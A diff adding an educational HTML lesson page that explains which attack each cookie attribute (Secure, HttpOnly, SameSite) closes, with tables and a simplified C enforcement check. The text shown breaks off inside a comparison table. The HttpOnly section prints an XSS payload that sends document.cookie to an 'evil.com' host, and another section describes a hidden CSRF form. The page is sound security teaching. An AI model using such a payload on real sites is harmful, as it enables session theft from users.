@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Secure, HttpOnly, SameSite — The Security Bug Each Attribute Fixes</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700;900&family=Source+Code+Pro:wght@400;600&family=Lato:wght@300;400;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:#0b0f1a; --bg2:#111827; --bg3:#1a2235; --card:#141c2e;
+  --border:#1e3a5f; --gold:#f5c842; --gold2:#c9a227;
+  --cyan:#38bdf8; --teal:#0d9488; --red:#f87171;
+  --green:#4ade80; --purple:#a78bfa; --orange:#fb923c;
+  --text:#e2e8f0; --muted:#7a9bbf; --code-bg:#060d1a;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:'Lato',sans-serif;font-size:17px;line-height:1.8;}
+
+.hero{min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;position:relative;overflow:hidden;padding:3rem 2rem;}
+.hero-grid{position:absolute;inset:0;background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px);background-size:60px 60px;opacity:.4;animation:gridPulse 8s ease-in-out infinite alternate;}
+@keyframes gridPulse{from{opacity:.25}to{opacity:.5}}
+.hero-glow{position:absolute;width:700px;height:700px;border-radius:50%;background:radial-gradient(circle,rgba(248,113,113,.1) 0%,transparent 70%);top:50%;left:50%;transform:translate(-50%,-50%);animation:glow 6s ease-in-out infinite alternate;}
+@keyframes glow{from{transform:translate(-50%,-50%) scale(1)}to{transform:translate(-50%,-50%) scale(1.15)}}
+.hero-content{position:relative;z-index:2;max-width:950px}
+.hero-tag{display:inline-block;background:rgba(248,113,113,.12);border:1px solid rgba(248,113,113,.3);color:var(--red);font-size:.75rem;letter-spacing:.2em;text-transform:uppercase;padding:.4rem 1.2rem;border-radius:2rem;margin-bottom:2rem;}
+.hero h1{font-family:'Playfair Display',serif;font-size:clamp(2.6rem,6vw,5rem);font-weight:900;line-height:1.1;color:#fff;margin-bottom:1.5rem;}
+.hero h1 span{color:var(--red)}
+.hero-sub{font-size:1.1rem;color:var(--muted);max-width:700px;margin:0 auto 2.5rem;}
+.hero-stats{display:flex;gap:2rem;justify-content:center;flex-wrap:wrap;margin-top:1rem;}
+.hero-stat .num{font-family:'Source Code Pro',monospace;font-size:1.7rem;font-weight:700;color:var(--red);}
+.hero-stat .lbl{font-size:.72rem;letter-spacing:.15em;text-transform:uppercase;color:var(--muted);}
+.hero-scroll{display:flex;align-items:center;gap:.6rem;color:var(--muted);font-size:.85rem;letter-spacing:.1em;text-transform:uppercase;margin-top:3rem;}
+.scroll-line{width:40px;height:1px;background:var(--muted)}
+
+.toc{position:fixed;right:1.5rem;top:50%;transform:translateY(-50%);display:flex;flex-direction:column;gap:.5rem;z-index:100;}
+.toc-dot{width:8px;height:8px;border-radius:50%;background:var(--border);border:none;cursor:pointer;transition:all .3s;text-decoration:none;display:block;}
+.toc-dot:hover,.toc-dot.active{background:var(--red);transform:scale(1.4);}
+@media(max-width:900px){.toc{display:none}}
+
+.container{max-width:1020px;margin:0 auto;padding:0 2rem}
+section{padding:5rem 0}
+section:nth-child(even){background:var(--bg2)}
+.section-num{font-family:'Source Code Pro',monospace;font-size:.8rem;color:var(--teal);letter-spacing:.2em;text-transform:uppercase;margin-bottom:.5rem;}
+h2{font-family:'Playfair Display',serif;font-size:clamp(1.8rem,4vw,2.6rem);color:#fff;margin-bottom:1.2rem;line-height:1.2;}
+h2 .accent{color:var(--red)}
+h2 .accent.g{color:var(--gold)}
+h2 .accent.c{color:var(--cyan)}
+h2 .accent.p{color:var(--purple)}
+h3{font-family:'Playfair Display',serif;font-size:1.3rem;color:var(--red);margin:2rem 0 .8rem;}
+p{margin-bottom:1.2rem;color:var(--text)}
+strong{color:var(--gold);font-weight:700}
+em{color:var(--cyan);font-style:normal}
+ul,ol{padding-left:1.5rem;margin-bottom:1.2rem;}
+li{margin-bottom:.4rem;color:var(--text);}
+
+.reveal{opacity:0;transform:translateY(28px);transition:opacity .55s ease,transform .55s ease;}
+.reveal.visible{opacity:1;transform:none}
+
+.callout{border-left:4px solid var(--gold);background:rgba(245,200,66,.06);padding:1.2rem 1.5rem;border-radius:0 8px 8px 0;margin:1.8rem 0;}
+.callout.cyan{border-color:var(--cyan);background:rgba(56,189,248,.06)}
+.callout.green{border-color:var(--green);background:rgba(74,222,128,.06)}
+.callout.red{border-color:var(--red);background:rgba(248,113,113,.06)}
+.callout.purple{border-color:var(--purple);background:rgba(167,139,250,.06)}
+.callout.orange{border-color:var(--orange);background:rgba(251,146,60,.06)}
+.callout-title{font-family:'Source Code Pro',monospace;font-size:.75rem;letter-spacing:.15em;text-transform:uppercase;margin-bottom:.6rem}
+.callout.gold .callout-title,.callout-title.gold{color:var(--gold)}
+.callout.cyan .callout-title{color:var(--cyan)}
+.callout.green .callout-title{color:var(--green)}
+.callout.red .callout-title{color:var(--red)}
+.callout.purple .callout-title{color:var(--purple)}
+.callout.orange .callout-title{color:var(--orange)}
+
+.formula{background:var(--code-bg);border:1.5px solid var(--red);border-radius:10px;padding:1.4rem 2rem;text-align:center;margin:1.8rem 0;font-family:'Source Code Pro',monospace;font-size:1.05rem;color:var(--red);letter-spacing:.04em;}
+.formula .label{display:block;font-size:.7rem;letter-spacing:.2em;text-transform:uppercase;color:var(--muted);margin-bottom:.6rem;font-family:'Lato',sans-serif;}
+.formula .sub{display:block;font-size:.82rem;color:var(--muted);margin-top:.6rem;font-family:'Lato',sans-serif;letter-spacing:0;}
+.formula.cyan{border-color:var(--cyan);color:var(--cyan)}
+.formula.gold{border-color:var(--gold2);color:var(--gold)}
+
+pre{background:var(--code-bg);border:1px solid var(--border);border-radius:10px;padding:1.8rem;overflow-x:auto;margin:1.5rem 0;position:relative;}
+pre .tag{position:absolute;top:.6rem;right:1rem;font-family:'Source Code Pro',monospace;font-size:.65rem;letter-spacing:.15em;text-transform:uppercase;color:var(--muted);background:var(--bg3);padding:.2rem .6rem;border-radius:4px;}
+code{font-family:'Source Code Pro',monospace;font-size:.87rem;line-height:1.9;}
+.kw{color:#c792ea}.fn{color:#82aaff}.str{color:#c3e88d}.num{color:#f78c6c}.cm{color:#546e7a;font-style:italic}.cls{color:#ffcb6b}.var{color:var(--cyan)}.hdr{color:var(--gold)}.att{color:var(--red)}
+
+.data-table-wrap{overflow-x:auto;margin:1.8rem 0}
+table{border-collapse:collapse;width:100%;font-family:'Source Code Pro',monospace;font-size:.87rem;}
+th{background:var(--bg3);color:var(--red);padding:.7rem 1.1rem;border:1px solid var(--border);text-align:left;letter-spacing:.06em;font-weight:600;}
+td{padding:.55rem 1.1rem;border:1px solid var(--border);color:var(--text);background:var(--card);}
+tr:hover td{background:var(--bg3)}
+td.hl{color:var(--cyan);font-weight:600} td.pos{color:var(--green)} td.neg{color:var(--red)} td.gold{color:var(--gold)}
+td.center{text-align:center}
+
+.step-list{list-style:none;padding:0;counter-reset:steps;margin:1.8rem 0;}
+.step-list li{counter-increment:steps;display:flex;gap:1.2rem;margin-bottom:1.8rem;align-items:flex-start;}
+.step-list li::before{content:counter(steps);flex-shrink:0;width:36px;height:36px;border-radius:50%;background:rgba(248,113,113,.15);border:1.5px solid var(--red);color:var(--red);font-family:'Source Code Pro',monospace;font-size:.85rem;font-weight:700;display:flex;align-items:center;justify-content:center;}
+.step-body strong{display:block;color:#fff;margin-bottom:.3rem;}
+
+.canvas-wrap{background:var(--code-bg);border:1px solid var(--border);border-radius:10px;overflow:hidden;margin:1.8rem 0;}
+.canvas-label{font-family:'Source Code Pro',monospace;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;color:var(--muted);padding:.6rem 1rem;border-bottom:1px solid var(--border);}
+canvas{display:block;width:100%;}
+
+.controls{display:flex;gap:1rem;flex-wrap:wrap;margin:1rem 0;align-items:center;}
+.ctrl-btn{background:rgba(248,113,113,.1);border:1.5px solid var(--red);color:var(--red);padding:.45rem 1.2rem;border-radius:6px;cursor:pointer;font-family:'Source Code Pro',monospace;font-size:.8rem;letter-spacing:.1em;text-transform:uppercase;transition:all .2s;}
+.ctrl-btn:hover{background:rgba(248,113,113,.22);}
+.ctrl-btn.green{border-color:var(--green);color:var(--green);background:rgba(74,222,128,.08);}
+.ctrl-btn.green:hover{background:rgba(74,222,128,.18);}
+.ctrl-btn.gold{border-color:var(--gold);color:var(--gold);background:rgba(245,200,66,.08);}
+.ctrl-btn.gold:hover{background:rgba(245,200,66,.18);}
+.ctrl-btn.cyan{border-color:var(--cyan);color:var(--cyan);background:rgba(56,189,248,.08);}
+
+.stat-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:1rem;margin:1.8rem 0;}
+.stat-card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1.1rem;text-align:center;}
+.stat-card .val{font-family:'Source Code Pro',monospace;font-size:1.7rem;font-weight:700;color:var(--red);margin-bottom:.3rem;}
+.stat-card .lbl{font-size:.75rem;color:var(--muted);letter-spacing:.1em;text-transform:uppercase;}
+
+.family-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:1rem;margin:1.8rem 0;}
+.family-card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1.2rem;}
+.family-card .fam-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:.7rem;}
+.family-card .fam-name{font-family:'Source Code Pro',monospace;font-size:.78rem;letter-spacing:.12em;text-transform:uppercase;font-weight:600;}
+.family-card .fam-count{font-family:'Source Code Pro',monospace;font-size:.75rem;background:rgba(248,113,113,.1);border:1px solid rgba(248,113,113,.25);color:var(--red);padding:.15rem .55rem;border-radius:3px;}
+.family-card .fam-desc{font-size:.88rem;color:var(--muted);line-height:1.5;margin-bottom:.8rem;}
+.feat-list{display:flex;flex-wrap:wrap;gap:.4rem;}
+.feat-pill{font-family:'Source Code Pro',monospace;font-size:.72rem;padding:.2rem .55rem;border-radius:3px;white-space:nowrap;}
+
+.compare-grid{display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;margin:1.8rem 0;}
+@media(max-width:640px){.compare-grid{grid-template-columns:1fr}}
+.compare-card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1.3rem;}
+.compare-card h4{font-family:'Source Code Pro',monospace;font-size:.75rem;letter-spacing:.14em;text-transform:uppercase;margin-bottom:.8rem;}
+.compare-card.good h4{color:var(--green)} .compare-card.bad h4{color:var(--red)}
+
+.glossary-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:1.1rem;margin-top:1.5rem;}
+.glossary-card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1.1rem 1.3rem;}
+.glossary-term{font-family:'Source Code Pro',monospace;font-size:.8rem;color:var(--red);letter-spacing:.07em;margin-bottom:.35rem;text-transform:uppercase;}
+.glossary-def{font-size:.9rem;color:var(--muted);line-height:1.6;}
+
+footer{padding:3rem 2rem;text-align:center;border-top:1px solid var(--border);color:var(--muted);font-size:.85rem;}
+footer a{color:var(--cyan);text-decoration:none;}
+
+.sidenote{background:var(--card);border:1px dashed var(--muted);border-radius:10px;padding:1.1rem 1.4rem;margin:1.8rem 0;font-size:.92rem;color:var(--muted);}
+.sidenote b{color:var(--gold)}
+
+/* attack-fix panel */
+.fix-panel{display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;margin:1.8rem 0;}
+@media(max-width:680px){.fix-panel{grid-template-columns:1fr}}
+.fix-card{border-radius:12px;padding:1.5rem;position:relative;overflow:hidden;border:1.5px solid transparent;}
+.fix-card.attack{background:rgba(248,113,113,.06);border-color:var(--red);}
+.fix-card.defense{background:rgba(74,222,128,.06);border-color:var(--green);}
+.fix-badge{display:inline-block;font-family:'Source Code Pro',monospace;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;padding:.25rem .7rem;border-radius:3px;margin-bottom:.8rem;}
+.fix-card.attack .fix-badge{background:rgba(248,113,113,.15);color:var(--red);border:1px solid rgba(248,113,113,.35);}
+.fix-card.defense .fix-badge{background:rgba(74,222,128,.15);color:var(--green);border:1px solid rgba(74,222,128,.35);}
+.fix-card h4{font-family:'Playfair Display',serif;font-size:1.1rem;color:#fff;margin-bottom:.6rem;}
+.fix-card p{font-size:.92rem;color:var(--text);margin-bottom:0;}
+
+/* attribute anatomy pill row */
+.attr-breakdown{margin:1.8rem 0;display:flex;flex-direction:column;gap:.7rem;}
+.attr-row{display:flex;gap:1rem;align-items:flex-start;background:var(--card);border:1px solid var(--border);border-radius:8px;padding:.8rem 1.1rem;}
+.attr-row .attr-code{font-family:'Source Code Pro',monospace;font-size:.85rem;color:var(--red);white-space:nowrap;min-width:150px;font-weight:600;}
+.attr-row .attr-desc{font-size:.9rem;color:var(--text);}
+.attr-row .attr-desc em{color:var(--cyan)}
+</style>
+</head>
+<body>
+
+<nav class="toc">
+  <a class="toc-dot" href="#hero" title="Intro"></a>
+  <a class="toc-dot" href="#framing" title="Attribute Framing"></a>
+  <a class="toc-dot" href="#secure" title="Secure"></a>
+  <a class="toc-dot" href="#httponly" title="HttpOnly"></a>
+  <a class="toc-dot" href="#samesite" title="SameSite"></a>
+  <a class="toc-dot" href="#csrfdemo" title="CSRF Demo"></a>
+  <a class="toc-dot" href="#table" title="Attribute Table"></a>
+  <a class="toc-dot" href="#prefixes" title="Cookie Prefixes"></a>
+  <a class="toc-dot" href="#defenseindepth" title="Defense in Depth"></a>
+  <a class="toc-dot" href="#glossary" title="Glossary"></a>
+</nav>
+
+<!-- HERO -->
+<section class="hero" id="hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="hero-content">
+    <div class="hero-tag">Session Hijacking · XSS Cookie Theft · Cross-Site Request Forgery</div>
+    <h1>Every Flag Closes<br><span>One Specific Door</span></h1>
+    <p class="hero-sub">The previous lesson showed you the mechanism: a cookie goes out, a cookie comes back, automatically, forever. That automatic part is exactly what makes it dangerous. This lesson takes each of the three security-relevant cookie attributes — <code>Secure</code>, <code>HttpOnly</code>, <code>SameSite</code> — and treats it as what it actually is: a named fix for one specific, nameable attack. No flag is decorative. Each one exists because someone got burned first.</p>
+    <div class="hero-stats">
+      <div class="hero-stat"><div class="num">Secure</div><div class="lbl">Closes: plaintext / network sniffing</div></div>
+      <div class="hero-stat"><div class="num">HttpOnly</div><div class="lbl">Closes: XSS session theft</div></div>
+      <div class="hero-stat"><div class="num">SameSite</div><div class="lbl">Closes: cross-site forgery</div></div>
+      <div class="hero-stat"><div class="num">2020</div><div class="lbl">Year Lax became the default</div></div>
+    </div>
+    <div class="hero-scroll"><div class="scroll-line"></div>Scroll to explore<div class="scroll-line"></div></div>
+  </div>
+</section>
+
+<!-- SECTION 0: FRAMING -->
+<section id="framing">
+<div class="container">
+  <div class="section-num">00 — How To Read This Lesson</div>
+  <h2>Not "Best Practice" — <span class="accent">A Named Attack, Closed</span></h2>
+
+  <p class="reveal">It's tempting to treat <code>Secure; HttpOnly; SameSite=Lax</code> as a checklist you copy-paste into every <code>Set-Cookie</code> header because "that's what security people say to do." That framing makes the attributes forgettable, because there's no story attached to them. The far more useful framing — and the one this lesson insists on — is: <strong>each attribute is the direct patch for one specific attack that was actually happening in the wild.</strong> Remove the attribute, and that exact attack becomes possible again. Nothing more mystical than that.</p>
+
+  <div class="callout red reveal">
+    <div class="callout-title">🎯 The Three Doors, Named Up Front</div>
+    <strong>Secure</strong> closes the door on your cookie leaking over an accidental plaintext HTTP connection or being sniffed on an insecure network. <strong>HttpOnly</strong> closes the door on an XSS bug being used to steal your session cookie directly via JavaScript. <strong>SameSite</strong> closes the door on Cross-Site Request Forgery — a malicious site triggering a request to your bank using <em>your</em> browser's automatically-attached session cookie. Three different attackers, three different vectors, three different fixes. None of them substitute for each other.
+  </div>
+
+  <p class="reveal">All three attributes live in the same <code>Set-Cookie</code> header from the previous lesson — none require any change to how the browser fundamentally stores or re-sends cookies. They're all just extra <em>rules</em> layered onto the same two-header mechanism, narrowing exactly when and how the browser is willing to hand your cookie back out.</p>
+</div>
+</section>
+
+<!-- SECTION 1: SECURE -->
+<section id="secure">
+<div class="container">
+  <div class="section-num">01 — Attribute One</div>
+  <h2><span class="accent">Secure</span>: The Attack It Closes</h2>
+
+  <p class="reveal">Without <code>Secure</code>, a cookie set over HTTPS is still eligible to be sent over a plain HTTP connection to the same domain — the browser doesn't care which scheme originally set it, only whether the current request's scheme, domain, and path match. That's the crack.</p>
+
+  <div class="fix-panel reveal">
+    <div class="fix-card attack">
+      <div class="fix-badge">⚔️ The Attack</div>
+      <h4>Network-Level Sniffing / Downgrade</h4>
+      <p>You're on public WiFi, logged into <code>bank.com</code> over HTTPS. Somewhere on the network, an attacker intercepts traffic. If <em>any</em> page ever loads even one resource over plain <code>http://bank.com/...</code> — a stray image, a redirect, an attacker actively forcing a downgrade — the browser will happily attach your session cookie to that unencrypted request. The attacker, sitting on the same network, reads it straight off the wire in plaintext and now owns your session.</p>
+    </div>
+    <div class="fix-card defense">
+      <div class="fix-badge">🛡️ The Fix</div>
+      <h4>Secure</h4>
+      <p>The <code>Secure</code> attribute tells the browser: never attach this cookie to a request unless the connection is HTTPS. Full stop, no exceptions, no fallback. If a page really does end up requesting the HTTP version of the site, the cookie simply doesn't go — the attacker's sniffer sees nothing usable, because there was never a plaintext copy of the cookie to intercept.</p>
+    </div>
+  </div>
+
+  <pre class="reveal"><span class="tag">HTTP Response Header</span><code><span class="hdr">Set-Cookie:</span> session_id=8f14e45fceea167a5a36dedd4bea2543; <span class="att">Secure</span>; Path=/</code></pre>
+
+  <div class="sidenote reveal">
+    <b>Secure protects the wire, not the endpoints.</b> A cookie marked <code>Secure</code> is still fully readable by legitimate JavaScript on the page (unless also <code>HttpOnly</code>) and still visible to anyone with access to the browser itself. <code>Secure</code> only ever answers one question — "is this specific network hop encrypted?" — nothing more. That's precisely why it's paired with HSTS (<code>Strict-Transport-Security</code>) in real deployments, which stops the browser from ever attempting the plaintext HTTP request in the first place.
+  </div>
+</div>
+</section>
+
+<!-- SECTION 2: HTTPONLY -->
+<section id="httponly">
+<div class="container">
+  <div class="section-num">02 — Attribute Two</div>
+  <h2><span class="accent">HttpOnly</span>: The Attack It Closes</h2>
+
+  <p class="reveal">Without <code>HttpOnly</code>, any JavaScript running on the page — including JavaScript the site's own developers never wrote — can read every non-HttpOnly cookie via <code>document.cookie</code>. That includes your session cookie, in plaintext, as a string.</p>
+
+  <div class="fix-panel reveal">
+    <div class="fix-card attack">
+      <div class="fix-badge">⚔️ The Attack</div>
+      <h4>XSS Session Theft</h4>
+      <p>Suppose a comment field on a forum fails to escape user input, and an attacker posts a comment containing <code>&lt;script&gt;fetch('https://evil.com/steal?c='+document.cookie)&lt;/script&gt;</code>. Anyone who views that comment runs the attacker's script, in the forum's own origin, with full access to <code>document.cookie</code>. The script reads the victim's session cookie and ships it straight to the attacker's server. The attacker pastes that stolen value into their own browser and is now logged in as the victim — no password needed, no further interaction required.</p>
+    </div>
+    <div class="fix-card defense">
+      <div class="fix-badge">🛡️ The Fix</div>
+      <h4>HttpOnly</h4>
+      <p>The <code>HttpOnly</code> attribute removes the cookie from JavaScript's visibility entirely. <code>document.cookie</code> simply never includes it, from any script, on any page, no matter how the script got there. The exact same XSS payload still executes — HttpOnly does nothing to stop the injection itself — but <code>document.cookie</code> now returns an empty string where the session ID used to be. The theft attempt runs and comes back with nothing.</p>
+    </div>
+  </div>
+
+  <pre class="reveal"><span class="tag">HTTP Response Header</span><code><span class="hdr">Set-Cookie:</span> session_id=8f14e45fceea167a5a36dedd4bea2543; Secure; <span class="att">HttpOnly</span>; Path=/</code></pre>
+
+  <div class="callout orange reveal">
+    <div class="callout-title">📌 HttpOnly Is Damage Control, Not a Cure</div>
+    HttpOnly does not fix the underlying XSS vulnerability — the attacker's script still runs, in the victim's browser, in the site's own origin. It just closes the single most common <em>post-XSS pivot</em>: exfiltrating the raw cookie value to read later. If the XSS-holding page instead issues an authenticated <code>fetch()</code> or <code>XMLHttpRequest</code> with <code>credentials: 'include'</code>, the browser will still automatically attach the HttpOnly cookie to <em>that</em> request — the attacker can trigger actions "as you" in real time, they just can't walk away with the token itself. If this project's Content-Security-Policy material (module <code>B13_csp</code>) is what you covered right before this, this is the same relationship it draws: CSP tries to stop the injected script from running at all, while HttpOnly assumes it might run anyway and limits what it can steal. Defense in depth, not either/or.
+  </div>
+</div>
+</section>
+
+<!-- SECTION 3: SAMESITE -->
+<section id="samesite">
+<div class="container">
+  <div class="section-num">03 — Attribute Three</div>
+  <h2><span class="accent">SameSite</span>: The Attack It Closes</h2>
+
+  <p class="reveal">This is the attribute that directly targets the automatic re-attachment behavior from the previous lesson. Recall: the browser attaches your cookies to a matching request <em>no matter what triggered that request</em> — your own click, or a hidden form on a completely different website that you merely had the misfortune of visiting.</p>
+
+  <div class="fix-panel reveal">
+    <div class="fix-card attack">
+      <div class="fix-badge">⚔️ The Attack</div>
+      <h4>Cross-Site Request Forgery (CSRF)</h4>
+      <p>You're logged into <code>bank.com</code> — a valid session cookie sits in your browser's jar. You then visit <code>totally-innocent-cat-pictures.com</code>, run by an attacker. That page contains a hidden auto-submitting form: <code>&lt;form action="https://bank.com/transfer" method="POST"&gt;</code> with fields for destination account and amount, submitted automatically by a script the instant the page loads. Your browser doesn't know or care that this POST originated from a shady cat photo site — it sees a request headed to <code>bank.com</code>, finds a matching cookie in the jar, and attaches it automatically, exactly as designed. <code>bank.com</code> receives what looks like a fully authenticated transfer request, because as far as the cookie mechanism is concerned, it is one.</p>
+    </div>
+    <div class="fix-card defense">
+      <div class="fix-badge">🛡️ The Fix</div>
+      <h4>SameSite</h4>
+      <p>The <code>SameSite</code> attribute tells the browser to withhold a cookie on requests that are <em>cross-site</em> — triggered by a different site than the one the cookie belongs to — regardless of whether that request would otherwise match on domain and path. It has three settings, each drawing the line in a different place, covered attribute-value by attribute-value below.</p>
+    </div>
+  </div>
+
+  <pre class="reveal"><span class="tag">HTTP Response Header</span><code><span class="hdr">Set-Cookie:</span> session_id=8f14e45fceea167a5a36dedd4bea2543; Secure; HttpOnly; <span class="att">SameSite=Lax</span>; Path=/</code></pre>
+
+  <h3>Strict — the maximal answer</h3>
+  <p class="reveal"><code>SameSite=Strict</code> withholds the cookie on every cross-site request, full stop — including a top-level navigation where you personally click a link from another site straight to <code>bank.com</code>. This closes CSRF completely, but at a real usability cost: if a user clicks a link to <code>bank.com/dashboard</code> from an email or another site, that first request arrives with no session cookie attached, and the user appears logged out even though they have a valid session. The <code>DECISIONS.md</code> for this project's <code>B17_cookies</code> module documents exactly this trade-off with OAuth redirect flows, where the identity provider's redirect back to your app is itself a cross-site navigation.</p>
+
+  <h3>Lax — the modern default</h3>
+  <p class="reveal"><code>SameSite=Lax</code> is more surgical: it withholds the cookie on cross-site <em>sub-resource</em> requests — the hidden auto-submitting form, an image tag, a background <code>fetch()</code>, an iframe load — but still allows it on a cross-site <strong>top-level navigation using a safe method</strong> (essentially, GET, as when you click a normal link). This is the setting that stops the cat-pictures CSRF attack above dead while still letting a bookmarked or emailed link to <code>bank.com</code> work normally. Since Chrome 80 (February 2020), browsers treat a cookie with <em>no</em> explicit <code>SameSite</code> attribute as <code>Lax</code> by default — a deliberate, retroactive fix applied to the entire existing web, because the original, no-restriction default was the whole reason CSRF was ever this widespread.</p>
+
+  <h3>None — explicitly opting back out</h3>
+  <p class="reveal"><code>SameSite=None</code> restores the old, unrestricted behavior: the cookie is sent on every cross-site request, full stop. Browsers require <code>None</code> to be paired with <code>Secure</code> — an unencrypted, fully cross-site-exposed cookie is considered unacceptable even by the "opt out of protection" setting. Legitimate cross-site cookie uses (third-party embeds, cross-site single sign-on, ad measurement) require <code>None</code>, which is exactly why an attacker can't just declare their forged request "not cross-site" — the classification is based on where the request actually originates, not on anything the attacker controls.</p>
+
+  <div class="data-table-wrap reveal">
+    <table>
+      <thead><tr><th>SameSite value</th><th>Cross-site sub-resource (form/img/fetch)</th><th>Cross-site top-level GET navigation</th><th>CSRF via hidden auto-POST form</th></tr></thead>
+      <tbody>
+        <tr><td class="gold">Strict</td><td class="neg">Blocked</td><td class="neg">Blocked</td><td class="pos">Fully blocked</td></tr>
+        <tr><td class="gold">Lax (default since 2020)</td><td class="neg">Blocked</td><td class="pos">Allowed</td><td class="pos">Blocked (POST is not a safe top-level nav)</td></tr>
+        <tr><td class="gold">None</td><td class="pos">Allowed</td><td class="pos">Allowed</td><td class="neg">Not blocked — needs a CSRF token instead</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>What the enforcement logic actually checks</h3>
+  <p class="reveal">This isn't hand-wavy — it's a concrete decision made once per outgoing request, per stored cookie. This project's own browser module implements it directly; the core check in <code>cookie.c</code> boils down to this shape:</p>
+
+  <pre class="reveal"><span class="tag">cookie.c — simplified</span><code><span class="kw">int</span> should_send_cookie(<span class="cls">cookie_t</span> *c, <span class="cls">http_request_t</span> *req, <span class="kw">int</span> is_top_level_navigation) {
+    <span class="cm">/* Secure: only over HTTPS */</span>
+    <span class="kw">if</span> (c-&gt;secure &amp;&amp; !req-&gt;is_https) <span class="kw">return</span> <span class="num">0</span>;
+
+    <span class="cm">/* SameSite check */</span>
+    <span class="kw">int</span> cross_site = !same_site_request(c-&gt;domain, req-&gt;origin);
+    <span class="kw">if</span> (cross_site) {
+        <span class="kw">if</span> (c-&gt;same_site == SAME_SITE_STRICT) <span class="kw">return</span> <span class="num">0</span>;
+        <span class="kw">if</span> (c-&gt;same_site == SAME_SITE_LAX) {
+            <span class="cm">/* Lax: allow only GET top-level navigations */</span>
+            <span class="kw">if</span> (!is_top_level_navigation) <span class="kw">return</span> <span class="num">0</span>;
+            <span class="kw">if</span> (strcmp(req-&gt;method, <span class="str">"GET"</span>) != <span class="num">0</span>) <span class="kw">return</span> <span class="num">0</span>;
+        }
+    }
+    <span class="kw">return</span> <span class="num">1</span>;
+}</code></pre>
+
+  <p class="reveal">Notice the order: <code>Secure</code> is checked completely independently of <code>SameSite</code> — a cookie can fail on either ground alone. And the <code>SameSite=Lax</code> branch is doing exactly two checks, both of which the hidden auto-submit form in this lesson's CSRF scenario fails: it isn't flagged as a genuine top-level navigation (the request didn't change the address bar of a page the user is actively looking at), and its method is <code>POST</code>, not <code>GET</code>. Fail either check and the function returns <code>0</code> — the cookie never leaves the jar.</p>
+
+  <div class="sidenote reveal">
+    <b>There was briefly a looser version of Lax.</b> Between 2019 and 2021 some browsers implemented a temporary "Lax + POST" grace period: a cookie with no explicit <code>SameSite</code> would still be sent on a cross-site top-level POST navigation for about two minutes after being set, specifically to avoid breaking OAuth flows that redirected via POST during the initial default-to-Lax rollout. It was later removed after being identified as its own narrow CSRF window — a reminder that even a security default's own transition period can become an attack surface if left in place too long.
+  </div>
+</div>
+</section>
+
+<!-- SECTION 4: CSRF DEMO CANVAS -->
+<section id="csrfdemo">
+<div class="container">
+  <div class="section-num">04 — Watch the Attack Get Blocked</div>
+  <h2>A Concrete CSRF Attempt, <span class="accent">Live</span></h2>
+
+  <p class="reveal">Below is the exact scenario from Section 03, animated frame by frame: a hidden form on <code>evil.com</code> auto-submits a transfer request to <code>bank.com</code>, and the browser decides — right at the moment of sending — whether the session cookie is allowed to travel with it. Run it once with no protection, then run it again with <code>SameSite=Lax</code> applied to the session cookie.</p>
+
+  <div class="canvas-wrap reveal">
+    <div class="canvas-label" id="csrfLabel">▶ Choose a scenario below to run it</div>
+    <canvas id="csrfCanvas" height="320"></canvas>
+  </div>
+  <div class="controls reveal">
+    <button class="ctrl-btn" onclick="runCSRF('none')">▶ Run with No SameSite (vulnerable)</button>
+    <button class="ctrl-btn green" onclick="runCSRF('lax')">▶ Run with SameSite=Lax (protected)</button>
+    <button class="ctrl-btn cyan" onclick="resetCSRF()">Reset</button>
+  </div>
+
+  <div class="callout green reveal">
+    <div class="callout-title">✅ Exactly What Lax Checks at Send Time</div>
+    When the hidden form on <code>evil.com</code> submits to <code>bank.com/transfer</code>, the browser's cookie-attachment logic asks two questions: is this request cross-site (yes — the initiating page's site is <code>evil.com</code>, the destination is <code>bank.com</code>), and if so, is this a top-level navigation using a safe method? A form auto-submitted via JavaScript in the background is neither a top-level navigation the user directly initiated in a meaningful sense, nor — critically — a GET. <code>SameSite=Lax</code> answers "withhold the cookie" for exactly this shape of request, which is precisely why the request that reaches <code>bank.com</code> in the protected run arrives with no session cookie, and the server has no way to treat it as an authenticated action.
+  </div>
+</div>
+</section>
+
+<!-- SECTION 5: ATTRIBUTE TABLE -->
+<section id="table">
+<div class="container">
+  <div class="section-num">05 — Side by Side</div>
+  <h2>All Three Attributes, <span class="accent">What Each Blocks</span></h2>
+
+  <div class="data-table-wrap reveal">
+    <table>
+      <thead><tr><th>Attribute</th><th>Attack it closes</th><th>Without it</th><th>What it does NOT protect against</th></tr></thead>
+      <tbody>
+        <tr><td class="gold">Secure</td><td class="hl">Plaintext network sniffing / HTTP downgrade</td><td class="neg">Cookie sent in cleartext over any HTTP request to the same domain, readable by anyone on the network path</td><td>XSS theft, CSRF — the cookie can still be stolen or misused entirely within HTTPS</td></tr>
+        <tr><td class="gold">HttpOnly</td><td class="hl">XSS reading the cookie via document.cookie</td><td class="neg">Any injected or malicious script on the page can exfiltrate the raw session value</td><td>XSS-triggered authenticated actions (fetch/XHR still auto-attach it); CSRF from other sites</td></tr>
